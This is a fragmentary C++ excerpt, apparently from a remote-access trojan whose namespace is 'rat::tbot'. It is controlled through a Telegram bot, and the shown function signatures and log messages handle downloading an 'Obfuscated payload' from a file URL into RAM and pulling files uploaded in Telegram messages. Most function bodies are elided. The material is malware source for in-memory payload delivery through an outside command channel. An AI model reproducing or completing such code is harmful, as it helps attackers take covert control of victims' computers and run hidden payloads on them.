...
Handler::downloadMultipleFiles(::rat::tbot::BaseBot *Tbot_Bot,
...
void Handler::handleXoredPayload(::rat::tbot::Message &Tbot_Message) {
    ...
    }
    {
        ...
        HANDLER_DEBUG_LOG("Downloading Obfuscated payload from File url: {}", file_url);
        ...
        this->sendMessage(fmt::format("Downloaded payload into RAM with uncompressed size {}",
...
void Handler::handleMessageWithUploadedFiles() {
    ...
    const auto file_paths =
        this->downloadMultipleFiles(this->bot.get(), this->telegram_update->message.files);
    if(!file_paths.empty()) {
